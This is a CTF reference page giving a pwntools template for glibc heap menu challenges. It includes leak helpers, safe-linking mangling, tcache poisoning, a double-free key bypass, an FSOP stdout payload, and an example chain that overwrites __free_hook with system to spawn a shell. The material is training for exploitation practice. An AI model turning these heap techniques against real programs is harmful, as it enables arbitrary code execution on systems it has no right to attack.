---
title: "Heap Menu Exploit Template - pwntools Boilerplate"
category: pwn
subcategory: heap
type: script
tags: [pwntools, heap, template, menu, alloc-free-edit-show, tcache, safe-linking, libc-leak, heap-leak, free-hook, one-gadget, mangle, demangle, pwndbg, gef, uaf, double-free]
summary: "Drop-in pwntools template for an alloc/free/edit/show heap challenge: menu wrappers, leak helpers, safe-linking mangle/demangle, and a libc-offset section."
tools: [pwntools, pwndbg, gef, one-gadget, pwninit]
related: [glibc-heap-cheatsheet, heap-tcache-poisoning, heap-safe-linking-bypass, heap-unsorted-bin-leak, heap-write-targets]
---

## What this is

The file below is the first thing to write on any heap challenge with a
`1) alloc 2) free 3) show 4) edit` menu. Adjust the four `sendlineafter` prompt
strings at the top of the wrapper section and everything else works unchanged.

It gives you:

- `alloc / free / show / edit` wrappers with an index bookkeeping dict
- `leak_libc_unsorted()` - the 0x418 + guard trick, no tcache filling needed
- `leak_heap_tcache()` - lone-entry leak that works with and without safe-linking
- `mangle()` / `demangle()` for glibc 2.32+
- a version-aware `poison()` that writes the right value for your libc
- a libc-offset section you fill from `nm -D`
- `GDB` support: `./exploit.py GDB` drops you into pwndbg at the right moment

## Usage

```bash
# 1. bind the binary to the challenge libc so your local heap matches remote
pwninit --bin ./chal --libc ./libc.so.6 --ld ./ld-2.31.so

# 2. local run
./exploit.py

# 3. local run under pwndbg, breaking after the leaks
./exploit.py GDB

# 4. remote
./exploit.py REMOTE HOST=chal.ctf.example PORT=1337

# 5. override the version-dependent behaviour
./exploit.py GLIBC=2.35          # enables safe-linking mangling
./exploit.py BIN=./chal_patched LIBC=./libc-2.27.so
```

## The template

```python
#!/usr/bin/env python3
"""Heap menu challenge template.

Adjust MENU_PROMPT / IDX_PROMPT / SIZE_PROMPT / DATA_PROMPT and the four
menu numbers, then build the exploit in pwn().

    ./exploit.py                      local
    ./exploit.py GDB                  local under pwndbg
    ./exploit.py REMOTE HOST=x PORT=y remote
    ./exploit.py GLIBC=2.35           safe-linking on
"""
from pwn import (ELF, args, context, gdb, log, p8, p16, p32, p64, pause,
                 process, remote, u8, u16, u32, u64)

# ============================================================== configuration
BINARY = args.BIN or "./chal"
LIBC_PATH = args.LIBC or "./libc.so.6"
HOST = args.HOST or "127.0.0.1"
PORT = int(args.PORT or 1337)
GLIBC = float(args.GLIBC or "2.31")

context.binary = elf = ELF(BINARY, checksec=False)
context.log_level = args.LOG or "info"
context.terminal = ["tmux", "splitw", "-h"]
libc = ELF(LIBC_PATH, checksec=False)

# --- menu prompts: CHANGE THESE FOUR LINES ---------------------------------
MENU_PROMPT = b"> "
IDX_PROMPT = b"index: "
SIZE_PROMPT = b"size: "
DATA_PROMPT = b"content: "
SHOW_PREFIX = b"content: "

OPT_ALLOC, OPT_FREE, OPT_SHOW, OPT_EDIT = 1, 2, 3, 4

GDBSCRIPT = """
set pagination off
break *malloc
break *free
continue
"""

# ==================================================================== process
def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([BINARY], gdbscript=GDBSCRIPT)
    return process([BINARY])


io = start()

# ============================================================ menu primitives
SLOTS = {}           # index -> requested size, so you never lose track


def menu(choice):
    io.sendlineafter(MENU_PROMPT, str(choice).encode())


def alloc(idx, size, data=b"A", newline=False):
    """Allocate `size` bytes into slot `idx` and fill it with `data`."""
    menu(OPT_ALLOC)
    io.sendlineafter(IDX_PROMPT, str(idx).encode())
    io.sendlineafter(SIZE_PROMPT, str(size).encode())
    if newline:
        io.sendlineafter(DATA_PROMPT, data)
    else:
        io.sendafter(DATA_PROMPT, data)
    SLOTS[idx] = size
    return idx


def free(idx):
    menu(OPT_FREE)
    io.sendlineafter(IDX_PROMPT, str(idx).encode())


def show_raw(idx):
    """Raw bytes the program prints back for slot `idx`."""
    menu(OPT_SHOW)
    io.sendlineafter(IDX_PROMPT, str(idx).encode())
    io.recvuntil(SHOW_PREFIX)
    return io.recvline().rstrip(b"\n")


def show(idx):
    """First qword of slot `idx`, little endian, NUL padded."""
    return u64(show_raw(idx).ljust(8, b"\x00")[:8])


def edit(idx, data, newline=False):
    menu(OPT_EDIT)
    io.sendlineafter(IDX_PROMPT, str(idx).encode())
    if newline:
        io.sendlineafter(DATA_PROMPT, data)
    else:
        io.sendafter(DATA_PROMPT, data)


# ============================================================ safe-linking
def mangle(pos, ptr):
    """PROTECT_PTR: `pos` is the address of the next/fd field being written."""
    return (pos >> 12) ^ ptr


def demangle(val):
    """REVEAL_PTR with no prior heap knowledge: peel 12 bits at a time."""
    mask, key = 0xFFF << 52, 0
    for _ in range(5):
        key |= ((key ^ val) & mask) >> 12
        mask >>= 12
    return key ^ val


def protect(pos, ptr):
    """Write-side helper that respects the configured glibc version."""
    return p64(mangle(pos, ptr) if GLIBC >= 2.32 else ptr)


def reveal(val):
    """Read-side helper that respects the configured glibc version."""
    return demangle(val) if GLIBC >= 2.32 else val


# ================================================================== leaks
def leak_libc_unsorted(scratch=90, guard=91, req=0x418):
    """0x418 rounds to a 0x420 chunk: too big for tcache, straight to unsorted.

    Needs a free index pair and a show() that survives free().
    Sets libc.address and returns it.
    """
    alloc(scratch, req, b"leaker")
    alloc(guard, 0x18, b"guard")      # stop the victim merging into the top chunk
    free(scratch)
    arena = show(scratch)
    if arena >> 40 != 0x7F:
        log.warning("unsorted leak looks wrong: %#x (did it hit the top chunk?)",
                    arena)
    libc.address = arena - 0x60 - libc.sym["main_arena"]
    if libc.address & 0xFFF:
        log.warning("libc base is not page aligned: %#x", libc.address)
    log.success("libc base = %#x", libc.address)
    return libc.address


def leak_heap_tcache(scratch=92, req=0x28, in_page_offset=None):
    """Free ONE chunk so the bin has a single entry, then read its next field.

    glibc >= 2.32: the stored value is (user_addr >> 12), i.e. the heap page.
    glibc <= 2.31: the stored value is 0, so we free TWO chunks instead.
    """
    if GLIBC >= 2.32:
        alloc(scratch, req, b"h")
        free(scratch)
        key = show(scratch)
        page = key << 12
        log.success("heap page = %#x  (safe-linking key = %#x)", page, key)
        if in_page_offset is not None:
            return page | (in_page_offset & 0xFFF)
        return page

    alloc(scratch, req, b"h1")
    alloc(scratch + 1, req, b"h2")
    free(scratch)
    free(scratch + 1)
    first = show(scratch + 1)
    log.success("heap chunk = %#x", first)
    return first


def leak_stack(libc_base=None):
    """Read `environ` out of libc. Requires an arbitrary read primitive.

    Fill in `read64` for your challenge (a tcache poison onto &environ plus a
    show() is the usual route).
    """
    if libc_base is None:
        libc_base = libc.address
    environ = libc.sym["environ"]
    log.info("environ is at %#x - read it with your arbitrary read", environ)
    return environ


# ============================================================ libc offsets
def libc_targets():
    """Everything you might want once libc.address is set."""
    t = {}
    for name in ("system", "execve", "open", "read", "write", "puts", "printf",
                 "setcontext", "environ", "main_arena", "_IO_2_1_stdout_",
                 "_IO_2_1_stdin_", "_IO_list_all", "_IO_wfile_jumps",
                 "__free_hook", "__malloc_hook", "__realloc_hook",
                 "global_max_fast", "__exit_funcs", "_IO_file_jumps"):
        if name in libc.sym:
            t[name] = libc.sym[name]
    try:
        t["binsh"] = next(libc.search(b"/bin/sh\x00"))
    except StopIteration:
        pass
    return t


def report_targets():
    t = libc_targets()
    for k in sorted(t):
        log.info("%-20s %#x", k, t[k])
    if "__free_hook" not in t:
        log.warning("no hooks in this libc (2.34+): plan for FSOP or __exit_funcs")
    return t


# ================================================================ attacks
def tcache_poison(victim_idx, victim_user_addr, target, size):
    """Point tcache[size] at `target`.

    victim_idx        an index whose chunk is currently in the tcache
    victim_user_addr  that chunk's user address (needed for the mangle)
    Two allocations of `size` after this: the real chunk, then `target`.
    """
    assert target % 0x10 == 0 or GLIBC < 2.34, \
        "glibc 2.34+ rejects a non-16-byte-aligned tcache target"
    edit(victim_idx, protect(victim_user_addr, target))
    log.info("tcache[%#x] head -> %#x", size, target)


def clear_tcache_key(idx):
    """Disarm the 2.29+ double-free detector with a 16-byte write."""
    edit(idx, p64(0) * 2)


def fill_tcache(size, base_idx=70, count=7, data=b"filler"):
    """Saturate a tcache bin so later frees take the fastbin/unsorted path."""
    for i in range(count):
        alloc(base_idx + i, size, data)
    for i in range(count):
        free(base_idx + i)
    log.info("tcache bin for size %#x is full (%d/7)", size, count)


def stdout_leak_payload():
    """33 bytes over _IO_2_1_stdout_: flags + a NUL over write_base's low byte."""
    return p64(0xFBAD1800) + p64(0) * 3 + p8(0x00)


# ==================================================================== exploit
def pwn():
    # ---- 1. leaks -------------------------------------------------------
    leak_libc_unsorted()
    targets = report_targets()
    heap = leak_heap_tcache()

    # ---- 2. the primitive ----------------------------------------------
    # Example: UAF tcache poison onto __free_hook.
    # Replace this block with the challenge's actual bug.
    SIZE = 0x88                       # -> 0x90 chunk, tcache index 7
    alloc(0, SIZE, b"A" * 8)
    alloc(1, SIZE, b"B" * 8)
    free(0)
    free(1)                           # tcache: 1 -> 0

    b_user = reveal(show(1))          # chunk 0's user address
    log.info("chunk 0 user = %#x  (heap page %#x)", b_user, heap)

    target = targets.get("__free_hook") or targets["_IO_2_1_stdout_"]
    # chunk 1's own user address = chunk 0's + one chunk
    tcache_poison(1, b_user + 0x90, target, SIZE)

    alloc(2, SIZE, b"consume")
    alloc(3, SIZE, p64(targets["system"]))
    log.success("wrote system to %#x", target)

    # ---- 3. cash out ----------------------------------------------------
    if "__free_hook" in targets:
        alloc(4, 0x18, b"/bin/sh\x00")
        free(4)
    else:
        log.warning("2.34+: finish with FSOP instead (see house-of-apple)")

    if args.PAUSE:
        pause()
    io.interactive()


if __name__ == "__main__":
    pwn()
```

## Adapting it

```text
the menu prompts differ            -> change MENU_PROMPT..SHOW_PREFIX at the top
the menu numbers differ            -> change OPT_ALLOC..OPT_EDIT
alloc does not take an index       -> drop the IDX_PROMPT line and keep your own counter
edit takes a length                -> add io.sendlineafter(b"length: ", ...) in edit()
show prints hex                    -> parse with int(io.recvline(), 16) in show_raw
the size is fixed                  -> delete the SIZE_PROMPT line, hardcode it
allocations use calloc             -> tcache poisoning will NOT be consumed by calloc;
                                      fill the tcache and use the fastbin instead
free() NULLs the pointer           -> no UAF; look for an overflow or a double free
                                      through a second index
```

## Debug hooks

```python
# Drop into pwndbg at an arbitrary point in the script:
#   1. run with ./exploit.py GDB
#   2. or attach mid-run:
from pwn import gdb, pause
gdb.attach(io, gdbscript="""
tcache
bins
vis_heap_chunks 20
""")
pause()
```

```text
# the four commands you will actually type
pwndbg> vis_heap_chunks 20
pwndbg> tcache
pwndbg> bins
pwndbg> try_free <chunk_addr>
```

## Sanity checks worth keeping

```python
#!/usr/bin/env python3
"""Standalone sanity checks for the helpers above - no target needed.

    python3 checks.py
"""


def mangle(pos, ptr):
    return (pos >> 12) ^ ptr


def demangle(val):
    mask, key = 0xFFF << 52, 0
    for _ in range(5):
        key |= ((key ^ val) & mask) >> 12
        mask >>= 12
    return key ^ val


def chunksize(req):
    return max(0x20, (req + 8 + 0xF) & ~0xF)


def main():
    # safe-linking round trip
    pos, ptr = 0x55A3B1E4C2A0, 0x55A3B1E4C340
    assert demangle(mangle(pos, ptr)) == ptr
    # lone entry: next == 0, so the stored value is the page number
    assert mangle(pos, 0) == pos >> 12
    # chunk geometry
    assert chunksize(0x18) == 0x20
    assert chunksize(0x88) == 0x90
    assert chunksize(0x408) == 0x410
    assert chunksize(0x409) == 0x420      # first size that skips tcache
    # tcache index
    assert (0x90 - 0x20) // 0x10 == 7
    assert (0x410 - 0x20) // 0x10 == 63
    print("[+] all template helper checks passed")


if __name__ == "__main__":
    main()
```
